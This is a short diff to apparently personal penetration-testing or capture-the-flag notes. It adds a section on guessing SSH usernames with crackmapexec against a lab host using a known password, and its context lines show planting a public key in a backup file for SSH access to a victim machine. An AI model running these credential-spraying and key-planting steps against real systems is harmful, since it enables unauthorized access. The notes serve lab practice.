@@ -94,4 +94,10 @@ echo "YOUR .PUB FILE BLABLABLA" > /opt/.backups/jake_id_rsa.pub.backup
 ssh -i file.pub USER@VICTIM_MACHINE
 ```
 
+## Brute force SSH by password
 
+If you know a password and want to guess the user use **crackmapexec**:
+
+```shell
+crackmapexec ssh wifinetic.htb -u users.txt -p 'VeRyUniUqWiFIPasswrd1!' --continue-on-success
+```
